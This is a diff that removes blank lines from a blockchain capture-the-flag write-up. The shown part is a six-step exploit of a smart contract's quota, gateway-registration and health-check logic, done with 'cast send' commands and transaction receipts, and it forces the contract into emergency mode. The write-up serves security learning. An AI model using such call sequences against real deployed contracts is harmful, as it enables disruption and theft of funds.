@@ -282,7 +282,6 @@ This highlights a broader lesson: in blockchain security, even tiny logic flaws 
 ```bash
 ### 1. Increase Quota to gatewayID 0
 └─$ cast send 0x0e4DdF5b518e0ea01fca26dcE01f8Ef073093925 "requestQuotaIncrease(uint8)" 0 --value 4ether --private-key <PRIVATE_KEY> --rpc-url http://94.237.59.38:42525
-
 blockHash            0x4f4470f7b52f63761dc4afd3d935c51d53201b539b7e920f7c9746747f7a2442
 blockNumber          2
 cumulativeGasUsed    74873
@@ -292,7 +291,6 @@ transactionHash      0xacc76c3172d4e87f7be7440751e674c50bd3585cb24414a67fbaf7b55
 
 ### 2. Increase Quota to gatewayID 1
 └─$ cast send 0x0e4DdF5b518e0ea01fca26dcE01f8Ef073093925 "requestQuotaIncrease(uint8)" 1 --value 4ether --private-key <PRIVATE_KEY> --rpc-url http://94.237.59.38:42525
-
 blockHash            0x532a38121b8da7e4cd670b6a5d157b1866d096c7fb6737e39309cc02a8a0684b
 blockNumber          3
 cumulativeGasUsed    57785
@@ -302,7 +300,6 @@ transactionHash      0x11c285c113f9a6ce3acbf4d194a7da3d02ccfeb957df070c8666d3050
 
 ### 3. Triggering Status Bug in PowerDelivery
 └─$ cast send 0x0e4DdF5b518e0ea01fca26dcE01f8Ef073093925 "requestPowerDelivery(uint256,uint8)" 1000000000000000000 0 --private-key <PRIVATE_KEY> --rpc-url http://94.237.59.38:42525
-
 blockHash            0x254b07d91e4127260ac0cd7d5618bcac4539ca9156d18fba072f7b68c99b1a50
 blockNumber          4
 cumulativeGasUsed    93960
@@ -313,7 +310,6 @@ transactionHash      0x33eaa695b00343f5473470f3aaf4206dc71784920166cca34d15ead07
 ### 4. Register Failing Gateways
 #### First Gateway
 └─$ cast send 0x0e4DdF5b518e0ea01fca26dcE01f8Ef073093925 "registerGateway()" --value 20ether --private-key <PRIVATE_KEY> --rpc-url http://94.237.59.38:42525
-
 blockHash            0x8c499caac7fb6a3fae410938d55d9943bf7b908ea152be7d1cb05371040e1847
 blockNumber          5
 cumulativeGasUsed    1114105
@@ -328,7 +324,6 @@ same as the first one
 
 ### 5. Update Health Percentage
 └─$ cast send 0x0e4DdF5b518e0ea01fca26dcE01f8Ef073093925 "infrastructureSanityCheck()" --private-key <PRIVATE_KEY> --rpc-url http://94.237.59.38:42525
-
 blockHash            0x1be580a2dd2bb773a3f36fb839d0b516ced9e83514f6fc1e7c24eb20762496b5
 blockNumber          8
 cumulativeGasUsed    124571
@@ -338,7 +333,6 @@ transactionHash      0x7e08e32522e997e0a23e390b488fb5c84fa72b1fd902993d387c1ebaf
 
 ### 6. Final Gateway to Trigger Emergency Mode
 └─$ cast send 0x0e4DdF5b518e0ea01fca26dcE01f8Ef073093925 "registerGateway()" --value 20ether --private-key <PRIVATE_KEY> --rpc-url http://94.237.59.38:42525
-
 blockHash            0x06f0a5105e14825bc8aeec0db0d8c90d094797301db9919123708e5d353d7cdb
 blockNumber          9
 cumulativeGasUsed    29403
